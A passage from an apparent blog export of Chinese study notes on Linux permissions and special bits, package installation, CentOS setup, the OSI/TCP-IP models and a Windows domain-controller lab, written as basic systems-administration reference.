用户名</code></p><p><strong>将用户密码进行解锁</strong>：<code>passwd -u 用户名</code></p><p><strong>查看用户的passwd状态</strong>：<code>passwd -S 用户名</code></p><p><u>gpasswd：</u></p><p><strong>将用户从组中删除：</strong><code>gpasswd -d user 组</code></p><p><u>chage：</u></p><p><strong>设置用户密码有效期：</strong><code>chage -M 天数 用户名</code></p><p><strong>设置用户下次登录必须修改密码：</strong><code>chage -d 0 用户名</code></p><h3 id="四、Linux权限"><a href="#四、Linux权限" class="headerlink" title="四、Linux权限"></a>四、Linux权限</h3><p><strong>查看目录权限的命令</strong>：<code>ls -ld 目录名</code></p><blockquote><p>第一段是文件类型和权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件类型：d目录、-二进制、b块设备、c字符设备...</span><br><span class="line">权限三段rwx分别是主、组和其他用户的读r、写w、执行权限位x</span><br><span class="line">    r                w            x</span><br><span class="line">文件：可读取文件    可修改文件内容    可执行文件</span><br><span class="line">目录：可查看目录内容    可增删文件    可以进入目录</span><br></pre></td></tr></table></figure><p>第二段是如果是目录就表示目录中的子目录数；如果是文件就是节点/硬链接数(深入讲就是硬盘里该部分数据在文件系统中的关联节点数)</p><p>第三段是文件属主</p><p>第四段是文件属组</p><p>第五六七段是最新修改时间</p><p>第八段是文件名</p><p>第九段我称其为安全权限位：如果使用了ACL就是<code>+</code>，如果开启了selinux每一个文件这个位置都是  <code>.</code> ，表示有selinux相关的安全上下文，使用<code>getfacl 文件名</code>可以查看。</p></blockquote><p><strong>修改文件权限的命令</strong>：<code>chmod 用户 算术运算符 权限 文件</code></p><blockquote><p>用户：u(所属者) g(所属组) o(其他用户) a(所有人)</p><p>算术运算符：+ - =</p><p>权限：r、w、x、s(SGID/SUID)、t(SBIT)</p></blockquote><p><strong>修改文件的所属者</strong>：<code>chown 用户名 文件</code></p><p><strong>修改文件的所属组</strong>：<code>chgrp 组名 文件</code></p><h3 id="五、Linux特殊的权限"><a href="#五、Linux特殊的权限" class="headerlink" title="五、Linux特殊的权限"></a>五、Linux特殊的权限</h3><p><strong>1、粘滞位（Sticky Bit）/SBIT</strong>：粘滞位权限只能针对目录文件赋权，目录中创建的文件只有建立者可以删除。该权限位一般用于系统运行生成临时文件的目录，例如/tmp，以防止其它坏蛋删除临时文件，影响系统运行。<code>chmod o+t</code></p><blockquote><p>在使用8进制表示的权限中，1XXX就表示特殊权限粘滞位SBIT的赋权。</p><p>当权限位 t 是大写 T 时，说明此处无 x 权限。（SBIT占用x权限位）</p></blockquote><p><strong>2、SGID（Set-GID）</strong>：SGID权限只能针对目录文件赋权，在该目录下建立的文件所属组继承父目录的属组。</p><blockquote><p>在使用8进制表示的权限中，2XXX就表示特殊权限粘滞位SGID的赋权。</p><p>当权限位 s是大写 S 时，说明此处无 x 权限。（SGID占用x权限位）</p></blockquote><p><strong>3、SUID（Set-UID）</strong>：SUID权限只能针对文件赋权，一般针对可执行文件，在运行这个可执行文件后创建的进程的操作权限和文件属主相同/或者说进程的euid赋值为文件属主的uid。</p><p>​    可想而知，具有SUID的root属主可执行文件是很危险的，一旦对这种进程成功攻击，则会拿到root的权限，因此对于SUID进程，linux很多程序都有相关的保护措施，比如代码中常用的system函数，它的原理是通过/bin/sh -c command来执行命令的，在Ubuntu16.04/12.04中/bin/sh软链接指向/bin/dash，而dash就实现了一个保护机制，当它发现自己在一个Set-UID进程中运行时，会将有效用户IDeuid转变为真实用户IDruid，主动放弃特权，防止权限泄露。</p><blockquote><p>在使用8进制表示的权限中，4XXX就表示特殊权限粘滞位SGID的赋权。</p><p>当权限位 s是大写 S 时，说明此处无 x 权限。（SUID占用x权限位）</p></blockquote><p><strong>查找SUID程序的方法：</strong><code>find 文件夹 -perm 4XXX/2XXX/1XXX </code></p><h3 id="六、修改文件属性"><a href="#六、修改文件属性" class="headerlink" title="六、修改文件属性"></a>六、修改文件属性</h3><p><strong>增加文件不可变的属性</strong>：<code>chattr +i /etc/passwd /etc/shadow</code></p><p><strong>让某个文件只能往里面追加数据，但不能删除，适用于各种日志文件：</strong><code>chattr +a /var/log/messages</code></p><p><strong>查看文件的属性:</strong><code>lsattr /etc/passwd /etc/shadow</code></p><h3 id="七、创建文件的默认权限"><a href="#七、创建文件的默认权限" class="headerlink" title="七、创建文件的默认权限"></a>七、创建文件的默认权限</h3><p>root和普通用户创建文件和目录的权限都不相同。</p><p>Linux认为目录的最高权限是0777、文件的最高权限是0666(因为不是所有文件都可以执行)</p><p>因此umask就是针对目录和文件的最高权限进行计算的。root的umask是0022；UID&gt;199且UID==GID的umask时002</p><p>一般推荐umask为027。</p><p><strong>修改umask的方法：</strong></p><p>1、临时修改：只需<code>umask 新的值</code></p><p>2、永久修改：/etc/profile（用户第一次登陆时执行） 在64行左右有一个对umask判断赋值的语句，判断是否UID大于199并且UID==GID，如果是，则umask002，否则umask022。可进行修改。/etc/bashrc （用户每次登录bash时执行），也要改。小心权限修改影响业务。</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2、安装Apache源码包与介绍RPM包</title>
      <link href="/2020/07/18/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/2%E3%80%81%E5%AE%89%E8%A3%85Apache%E6%BA%90%E7%A0%81%E5%8C%85%E3%80%81%E4%BB%8B%E7%BB%8DRPM%E5%8C%85%E3%80%81yum%E6%BA%90/"/>
      <url>/2020/07/18/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/2%E3%80%81%E5%AE%89%E8%A3%85Apache%E6%BA%90%E7%A0%81%E5%8C%85%E3%80%81%E4%BB%8B%E7%BB%8DRPM%E5%8C%85%E3%80%81yum%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h2 id="安装Apache源码包与介绍RPM包"><a href="#安装Apache源码包与介绍RPM包" class="headerlink" title="安装Apache源码包与介绍RPM包"></a>安装Apache源码包与介绍RPM包</h2><h3 id="一、Centos6安装Apache的步骤"><a href="#一、Centos6安装Apache的步骤" class="headerlink" title="一、Centos6安装Apache的步骤"></a>一、Centos6安装Apache的步骤</h3><p>1、将源码压缩包移动到/usr/src 或者 /usr/share下</p><p>2、查看INSTALL文档，编译安装三步骤：./configuration –prefix=安装目录（可缺省，缺省就是/usr/local/apache2）；make；make install</p><p>3、去源码路径的bin下apachectl start即可开启Apache的http服务（关闭就是stop）</p><p><strong>源码包Apache的主页</strong>：在安装路径中的htdocs文件夹中。</p><p><strong>修改Apache的端口号：</strong>1)源码包：$PREFIX/conf/http.conf 2)封装包：/etc/httpd/conf/http.conf; 然后重启</p><h3 id="二、端口相关命令"><a href="#二、端口相关命令" class="headerlink" title="二、端口相关命令"></a>二、端口相关命令</h3><p><code>ss -an</code>：比 netstat 好用的socket统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息</p><p>干掉占用端口的进程:<code>netstat -tnlp | grep 80 ; kill PID</code></p><h3 id="三、不同Linux操作系统下的安装包"><a href="#三、不同Linux操作系统下的安装包" class="headerlink" title="三、不同Linux操作系统下的安装包"></a>三、不同Linux操作系统下的安装包</h3><p><strong>Debian</strong>: deb；<strong>Red Ha</strong>t: rpm,</p><p><strong>RPM包的命名格式</strong>：<code>名字 版本号 编辑次数 系统版本(EL6 == RED HAT6) 系统架构（noarch == 所有cpu架构可用）</code></p><p><strong>查看所有已安装的rpm包</strong>：<code>rpm -qa (query all)</code> </p><p><strong>查看rpm包安装的软件文件列表</strong>:<code>rpm -ql rpm包</code></p><p><strong>查看rpm包的详细信息</strong>：<code>rpm -qpi  rpm包(query package information)</code></p><p><strong>查看rpm的文件列表与安装路径</strong>：<code>rpm-qpl rpm包(list)</code></p><p><strong>安装rpm包</strong>：<code>rpm -ivh rpm包（install verify hash安装时列出标记）</code></p><p><strong>卸载rpm包安装的</strong>：<code>rpm -e 软件名</code>（软件之间会有依赖关系，需要按照依赖逐个rpm -e）</p><p><strong>yum软件安装的各种文件都在哪？</strong>：分布在各个地方，不在一个目录，比如配置文件在/etc,执行文件在/usr/bin,/usr/sbin/, 库文件在/usr/lib, 等等</p><h3 id="四、源码包与RPM包的不同"><a href="#四、源码包与RPM包的不同" class="headerlink" title="四、源码包与RPM包的不同"></a>四、源码包与RPM包的不同</h3><p><strong>源码包</strong>：由厂商开源发布，安装时可定制安装路径，整个软件所有产生的文件都集中在一个文件夹里，方便删除和移动。</p><p><strong>RPM包</strong>：由厂商封装好，操作系统提供RPM包管理支持，安装路径固定，且分散（比如配置文件在/etc，可执行文件在/bin），不可以详细的定制安装路径，但是方便管理，只需要使用rpm命令工具即可进行管理操作，无需手动管理。</p><h3 id="五、Yum源安装软件"><a href="#五、Yum源安装软件" class="headerlink" title="五、Yum源安装软件"></a>五、Yum源安装软件</h3><p>Yum源工具本身就是为了使安装与卸载等操作简单化，原理上是根据配置文件中的依赖关系列表来自动化处理依赖关系。</p><h4 id="1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖"><a href="#1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖" class="headerlink" title="1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖"></a>1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖</h4><p><strong>yum配置文件路径</strong>：/etc/yum.repo.d</p><p>1）首先将yum.repo.d下的所有配置文件备份到一个bak文件夹中</p><p>2）新建一个文件dvd.repo，并且编辑它</p><p>3）内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dvdrom] #标签</span><br><span class="line">name=&quot;yum dvd rom&quot; #描述</span><br><span class="line">baseurl=file:///media/CentOS_6.9_Final #依赖关系列表位置</span><br><span class="line">gpgcheck=0 #是否进行密钥对检查，如需检查，下一行需要写公钥文件位置gpgkey=file:///XXXX（由于公钥是权威的Centos的公钥，而私钥无人知道，因此很保密、权威）</span><br></pre></td></tr></table></figure><p>依赖关系列表就存储在光盘中的repodata中，以xml的形式存在。 这些xml应该不仅描述了软件的依赖，还描述了软件的安装地址。（否则如何在不联网的情况下自动安装了DVD1中的rpm）</p><p><strong>yum安装软件</strong>：<code>yum install 软件名</code></p><p><strong>yum卸载软件</strong>：<code>yum remove 软件名</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、部署Centos以及Linux基本命令与知识</title>
      <link href="/2020/07/17/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2Centos%E4%BB%A5%E5%8F%8ALinux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%B8%8E%E7%9F%A5%E8%AF%86-1/"/>
      <url>/2020/07/17/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2Centos%E4%BB%A5%E5%8F%8ALinux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%B8%8E%E7%9F%A5%E8%AF%86-1/</url>
      
        <content type="html"><![CDATA[<h2 id="部署Centos"><a href="#部署Centos" class="headerlink" title="部署Centos"></a>部署Centos</h2><h3 id="一、部署Centos6-9系统"><a href="#一、部署Centos6-9系统" class="headerlink" title="一、部署Centos6.9系统"></a>一、部署Centos6.9系统</h3><blockquote><p>部署Centos6.9系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、安装且升级一个已存在的操作系统</span><br><span class="line"></span><br><span class="line">2、用基本图形驱动安装系统</span><br><span class="line"></span><br><span class="line">3、安装救援系统</span><br><span class="line"></span><br><span class="line">4、从本地驱动启动</span><br><span class="line"></span><br><span class="line">5、内存检测</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳过光盘检查</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">取消UTC时间</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择适用所有空件，并选中查看并修改系统分区</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">选择现在自定义，自定义安装系统服务软件</span><br><span class="line">桌面 -&gt; 除了kde桌面其余全部打钩，并且将开发里面的所有选项打钩</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kdump用不用都可</span><br></pre></td></tr></table></figure></blockquote><h3 id="二、系统初始操作"><a href="#二、系统初始操作" class="headerlink" title="二、系统初始操作"></a>二、系统初始操作</h3><p>1、关闭防火墙：<code>setup</code>图形化操作界面。查看防火墙的规则状态：<code>iptables -nL</code></p><p>2、关闭SElinux：/etc/selinux/config 配置文件中的SELINUX=disabled</p><h3 id="三、查看系统基本状态"><a href="#三、查看系统基本状态" class="headerlink" title="三、查看系统基本状态"></a>三、查看系统基本状态</h3><p><strong>查看硬盘大小</strong>：<code>fdisk -l</code></p><p><strong>硬盘相关知识：</strong>Linux中挂载的SATA硬盘是SD开头，/dev/sda表示第一块硬盘、/dev/sdb表示第二块以此类推(Linux2.X以后所有硬盘都是sd开头了（以前还有HDA IDE接口的第一块硬盘）?) /dev/sda1就表示第一块硬盘的第一个分区，以此类推。</p><p><strong>查看内存信息</strong>：<code>cat /proc/meminfo</code></p><p><strong>查看cpu信息</strong> :<code>cat /proc/cpuinfo</code></p><h3 id="四、Linux根目录结构"><a href="#四、Linux根目录结构" class="headerlink" title="四、Linux根目录结构"></a>四、Linux根目录结构</h3><p>Linux系统文件组织形式采用FHS文件系统层次化标准</p><blockquote><p>鸟哥的Linux私房菜(顶顶的)：<a href="http://linux.vbird.org/linux_basic/0210filepermission.php#dir">http://linux.vbird.org/linux_basic/0210filepermission.php#dir</a></p></blockquote><p><a href="https://imgchr.com/i/UsUbZV"><img src="https://s1.ax1x.com/2020/07/17/UsUbZV.png" alt="UsUbZV.png"></a></p><p>除FHS标准以外，Linux增设的目录。</p><p><a href="https://imgchr.com/i/UsN9p9"><img src="https://s1.ax1x.com/2020/07/17/UsN9p9.png" alt="UsN9p9.png"></a></p><p>重点在于：/proc 和 /sys 其实是虚拟文件系统，不占用硬盘空间，只占用内存空间。另外/usr不是”user”而是unix software resource。</p><h3 id="五、基本的Linux命令与快捷键"><a href="#五、基本的Linux命令与快捷键" class="headerlink" title="五、基本的Linux命令与快捷键"></a>五、基本的Linux命令与快捷键</h3><p><code>ls -a</code> List files显示所有文件（包括隐藏文件）</p><p><code>Ctrl+l</code>清屏、<code>Ctrl+c</code>打断目前命令</p><p><code>help</code>，除man手册以外Linux自带的帮助命令。</p><p><code>du</code>查看文件所占磁盘大小，以块大小为单位！默认1个块block是4KB，也就是4096字节。</p><p><strong>复制与转换一个文件</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if&#x3D;输入文件 of&#x3D;输出文件 bs&#x3D;单位 count&#x3D;多少个单位</span><br></pre></td></tr></table></figure><p><strong>压缩文件</strong>：<code>gzip 文件名， bzip2 文件名</code>（不保留源文件），<code>gzip/bzip -c 文件名 &gt; *.gz/bz2</code>，（保留原文件，-c是将压缩结果输出）</p><p><strong>解压文件</strong>：<code>gunzip 压缩包/gzip -d 压缩包；bunzip2 压缩包/bzip2 -d 压缩包</code> (不保留原文件)，``gzip/bzip -dc 压缩包 &gt; 新文件名`（保留原文件）</p><p><strong>查看压缩文件</strong>：<code>zcat/bzcat *.gz/*.bz2</code></p><p><strong>查看系统开启的端口状态：</strong><code>ss -an</code></p><p><strong>查看系统进程占用的端口状态：</strong><code>netstat -t(TCP)nlp（进程号与程序名称）</code></p><p><strong>tar工具对目录进行打包和压缩</strong>：</p><blockquote><p><strong>tar [主选项+辅选项] [文件1] [文件2] [目录1] [目录2] [……]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主选项：（每次只能使用一个）</span><br><span class="line">c 创建一个新归档文件（小c）</span><br><span class="line">x 从归档文件中提取文件出来 #主选项x会自动识别归档文件压缩的格式，并进行解压</span><br><span class="line">t 列出归档文件的内容</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">辅选项：（每次可以使用多个）</span><br><span class="line">z 通过gzip的支持进行压缩&#x2F;解压，一般格式为*.tar.gz</span><br><span class="line">j 通过bzip2的支持进行压缩&#x2F;解压，一般格式为*.tar.bz2</span><br><span class="line">v 归档或解包过程中显示被打包的文件</span><br><span class="line">C 只在解压时，若要在特定目录解压,使用它（大C）</span><br><span class="line">P 对绝对路径的文件或目录进行操作(默认tar用相对路径)</span><br><span class="line">f 输出结果到文件，必须选该项</span><br></pre></td></tr></table></figure></blockquote><h3 id="六、Linux文件的类型"><a href="#六、Linux文件的类型" class="headerlink" title="六、Linux文件的类型"></a>六、Linux文件的类型</h3><p>1、 <strong>-</strong> ：常规文件regular file， 纯文字文件，二进制文件，数据格式文件。</p><p>2、<strong>d</strong>：目录directory。</p><p>3、<strong>l</strong>：链接文件link。硬链接，inode相同，都指向硬盘里同一个存储数据。软连接，inode不同，指向的是另外一个inode。</p><p>4、<strong>b</strong>:块设备文件block，这种设备可以随意在不同的区域读写，如硬盘、软盘等，如/dev/sda。</p><p>5、<strong>c</strong>：字符设备文件character，字符设备文件必须一次性读取数据，如键盘、鼠标等。</p><p>6、<strong>s</strong>：数据接口文件sockets，通常用于网络传输，例如/dev/tcp/XXXX</p><p>7、<strong>p</strong>：管道文件FIFO。</p><h3 id="七、Vim快捷命令"><a href="#七、Vim快捷命令" class="headerlink" title="七、Vim快捷命令"></a>七、Vim快捷命令</h3><p>删除行：<code>数字+dd</code>删除光标以及下面的n行，默认是1行</p><p>复制当前行：<code>yy</code></p><p>复制到光标上一行：<code>P</code></p><p>移到文件首：<code>gg</code>，移到文件末：<code>G</code>，移动到第n行：<code>nG</code></p><p>移动到行首：<code>数字0/Home键/^</code>，移动到行尾：<code>End/$</code></p><p>匹配上一个匹配字：<code>N</code></p><p>命令模式下<code>ZZ</code>相当于<code>wq</code>无需输入<code>:</code>即可保存退出</p><p>替换字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;s&#x2F;被替代&#x2F;替代的字符串&#96; （只替换光标当前行的第一个匹配的字符串）</span><br><span class="line">&#96;s&#x2F;被替代&#x2F;替代的字符串&#x2F;g&#96; （只替换光标当前行所有匹配的字符串）</span><br><span class="line">&#96;n1,n2 s&#x2F;被替代&#x2F;替代的字符串&#x2F;g&#96; （替换n1到n2行所有匹配的字符串）</span><br><span class="line">&#96;% s&#x2F;被替代&#x2F;替代的字符串&#x2F;g&#96; （替换当前页所有匹配的字符串）</span><br></pre></td></tr></table></figure><p>另存为当前文件（备份）:<code>w /路径/文件名（可绝对可相对）</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12、OSI和TCP/IP模型</title>
      <link href="/2020/06/13/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/12OSI%E5%92%8CTCPIP%E6%A8%A1%E5%9E%8B/"/>
      <url>/2020/06/13/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/12OSI%E5%92%8CTCPIP%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI和TCP-IP模型"><a href="#OSI和TCP-IP模型" class="headerlink" title="OSI和TCP/IP模型"></a>OSI和TCP/IP模型</h2><h3 id="一、分层思想"><a href="#一、分层思想" class="headerlink" title="一、分层思想"></a>一、分层思想</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>1、降低工作量，提高工作效率。</p><p>2、每一层的工作和协议都是独立的（专注独立的做自己的事情）。</p><p>3、下层为上层提供服务。</p><h3 id="二、OSI七层模型-Open-System-interconnection"><a href="#二、OSI七层模型-Open-System-interconnection" class="headerlink" title="二、OSI七层模型(Open System interconnection)"></a>二、OSI七层模型(Open System interconnection)</h3><p>应用层：应用软件的信息协议（QQ、HTTP），主要用作是传输软件数据。</p><p>表示层：将信息通过字符编码协议进行数字编码。</p><p>会话层：协调应用会话的发送顺序。（QQ\WX\PUBG谁先从网线走，谁后走）</p><p>应用层、表示层和会话层 合并成一层！ 应用层！这就是TCP/IP五层模型！</p><h3 id="三、TCP-IP五层模型"><a href="#三、TCP-IP五层模型" class="headerlink" title="三、TCP/IP五层模型"></a>三、TCP/IP五层模型</h3><h4 id="前言"><a href="#前言" class="headerlink" title="- 前言"></a>- 前言</h4><p>虽然OSI七层模型是世界标准组织发布的第一个网络模型，但是实际上没有被广泛应用。被广泛应用至今的是TCP/IP五层模型。名字由来是因为TCP和IP协议是网络模型中最重要的两个协议。</p><p><a href="https://imgchr.com/i/NSrOUO"><img src="https://s1.ax1x.com/2020/06/14/NSrOUO.png" alt="NSrOUO.png"></a></p><h4 id="TCP-IP五层模型数据的封装与解封"><a href="#TCP-IP五层模型数据的封装与解封" class="headerlink" title="- TCP/IP五层模型数据的封装与解封"></a>- TCP/IP五层模型数据的封装与解封</h4><h5 id="数据包封装"><a href="#数据包封装" class="headerlink" title="==========数据包封装"></a>==========数据包封装</h5><p><strong>应用层</strong>：见上。<u>(HTTP 80、HTTPS 443、TELNET 23、FTP 20 21、RDP 3389、SMB 445、Mysql 3306 、DHCP 67/68 <strong>UDP</strong>、DNS 53 <strong>TCP&amp;UDP</strong>[1]、SMTP 25、POP3 110)</u>#缺省TCP协议#</p><p><strong>传输层</strong>：加一个TCP/UDP包头，主要目的是完成进程与进程之间通信，在数据包头中加入源端口号和目标端口号数据段。<u>（TCP、UDP）</u>{防火墙}</p><p><strong>网络层</strong>：加一个IP包头，源IP、目标IP。<u>（IP、ICMP、ARP）</u>{路由器}</p><p><strong>数据链路层</strong>（到达网卡）：网络层的数据 + MAC子层（帧头[火车头]）、FCS（帧尾[火车头]），形成一个帧数据包。<u>（MAC子层协议）</u>{交换机}</p><p><strong>物理层</strong>（网线）：一个一个帧包传输送走。{网线、空气、光纤}</p><h5 id="数据包解封"><a href="#数据包解封" class="headerlink" title="========数据包解封"></a>========数据包解封</h5><p>解封时，每一层只专注于自己加工的位置。</p><h5 id="术词定义"><a href="#术词定义" class="headerlink" title="术词定义"></a>术词定义</h5><p>1、高层数据：应用层的数据</p><p>2、段：传输层的数据。</p><p>3、报文/IP包/包：网络层的数据。</p><p>4、帧：数据链路层的数据，（MAC帧头、FCS帧尾）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">问题：1、每层常见协议 2、应用层常见协议端口 3、应用层和运输层的关联 4、每层的运输单元 5、每层的工作设备</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11、Windows域</title>
      <link href="/2020/06/09/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/11%E5%9F%9F/"/>
      <url>/2020/06/09/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/11%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows域"><a href="#Windows域" class="headerlink" title="Windows域"></a>Windows域</h2><h3 id="一、域的基本概念"><a href="#一、域的基本概念" class="headerlink" title="一、域的基本概念"></a>一、域的基本概念</h3><p>域（Domain）：一种<u>网络环境</u>。</p><p><strong>网络环境：</strong></p><p>1、域环境：不平等环境，角色有等级之分，更方便集中管理、统一管理。</p><p>2、工作组环境：默认模式，人人平等。缺点：不方便管理。</p><p><strong>域的特点</strong>：集中管理、统一管理。</p><p><strong>域的成员组成</strong>：</p><p>1、域控制器DC（Domain Controller）：AD活动目录、组策略GPO</p><p>2、成员机</p><p><strong>域名</strong>：整个域环境的名字（例如：qq.com）。</p><p><strong>主机名</strong>：域中的主机名（例如：zjc.qq.com），主机可以被分配到不同的OU中。</p><p><strong>OU（组织单位）</strong>：OU是组策略的下发单位，<strong>域也是OU，是最大的OU</strong>。</p><h3 id="二、组策略"><a href="#二、组策略" class="headerlink" title="二、组策略"></a>二、组策略</h3><p>组策略：Group Policy == GPO，可以对AD活动目录中的不同部门设置不同的GPO组策略，实现不同的控制。</p><p>下发组策略：使用<u>组策略管理</u>的模块进行设置。</p><p>组策略生效的顺序：L(本地)S(站点/林)D(域)OU(组织架构)</p><p><u>强制组策略</u>：使下级组织架构OU的组策略不生效（DC不下发下级组单位的组策略）。（右键策略 -》 强制）</p><p><u>阻止继承</u>：不继承上级的组策略，只生效自己OU设置的组策略。（）（右键组织架构文件夹 -》 组织继承）</p><p><u>让一个用户不受任何策略的影响</u>：设置该用户的组织单位策略强制，然后在强制策略的权限中将该用户添加，然后设置高级设置让此用户拒绝所有权限。</p><h3 id="三、域的部署"><a href="#三、域的部署" class="headerlink" title="### 三、域的部署"></a>### 三、域的部署</h3><p>要想部署域环境 —》 首先需要一台域控制器DC</p><p>要想安装一台DC –》 需要安装“AD活动目录” 和 “DNS服务器”</p><blockquote><p>活动目录：Active Directory == AD， DNS在域中的作用：定位寻址主机。</p></blockquote><hr><blockquote><p>实验环境：Win2008域控制、XP域用户、win7域用户</p><p>1、还原快照，开启2008虚拟机，桥接vmnet1，配置静态地址10.1.1.2/24（禁用ipv6！重开网卡清除ipv6缓存！）修改计算机名为DC1！</p><p>2、活动目录的安装向导：开始 -》 运行 -》 <strong>dcpromo</strong> -》 弹出向导 -》</p><p>选择向导中安装DNS服务器（方便正确关联，为了提醒自动安装DNS服务器，不要配置DNS地址）-》</p><p>林的概念（域（业务）、域树（加入业务分公司，形成域树）、森林（多个业务树））整个林中最牛逼的是第一个DC服务器 ，创建新林 -》</p><p>设置林根域的FQDN（完全限定域名） zjccorp.com -》</p><p>林功能级别，设置整个森林DC服务器的能力等级（服务器版本），所以其他域树一定不能低于这个服务器版本 （建议选2003） -》</p><p>域功能级别，设置该域的DC服务器的能力等级（服务器版本），所以该域中如果出现其他DC服务器，一定不能低于这个服务器版本（建议选择2003） -》</p><p>AD数据库、日志文件、策略文件的存储位置（默认）-》</p><p>设置一个目录还原模式的账户密码（123.com） -》</p><p>安装，勾选完成后重新启动</p><p>3、重启后登录DC：发现本地管理员Administrator已经升级成为域管理员 ==二级域名\用户名、本地来宾guest升级为域来宾账号。本地用户都移动到AD活动目录中去了。</p><p>4、验证DC是否部署成功：查看计算机名是否修改为 计算机名.二级域名.com，并且新增了域字段： zjccorp.com。</p><p>5、查看管理工具，新增了DNS、ACtive DIrectory*等。验证DNS是否部署成功。</p><p>6、打开Active Directory用户和计算机 ，验证是否可以打开、是否报错。发现Users中找到了我们原来的本地账户（已升级为域用户）。Domain Admins组、Domain Users（默认域用户都在这）组。computers用户计算机、Domain Controllers域控制器。</p><p>7、员工机器加入域，测试域是否部署成功：</p><p>将客户机Xp加入域：还原快照、桥接vmnet1、配置IP10.1.1.1/24、DNS服务、修改主机名</p><p>更改工作组到域：计算机管理 -》 更改工作组 -》隶属于域 zjccorp.com，输入域管理账户密码zjccorp.com\administrator ; 123.com。</p><p>8、服务器验证员工是否成功加入域：DCDomain Controller验证computer组是否加入客户机，看DNS是否存在客户机。</p><p>9、域控制器给员工创建域账号：一般用户登录名叫jiacheng.zhong，美式标记法。密码要符合复杂性要求123.com。查看users中，新增了域账户，隶属domain users组</p><p>10、员工登陆测试：选项 -》 选择本机工作组还是域 -》输入账号密码，成功登录</p><p>11、使用win7用户测试创建域用户以及登录一次</p><p>12、下发组策略是以部门为单位，所以要创建<strong>组织架构（OU）</strong>：</p><p>​            域 右键 -》 新建组织单位 -》 设置名称：天融信集团 ；</p><p>​            新建天融信集团的子组织单位： 右键天融信集团 -》 新建组织架构 </p><p>。。。。。。</p><p>​            组织中加入成员： 在 Users中选择用户 右键 -》 所有任务 -》 移动</p><p>13、创建组策略： 组策略管理 -》 右键OC -》 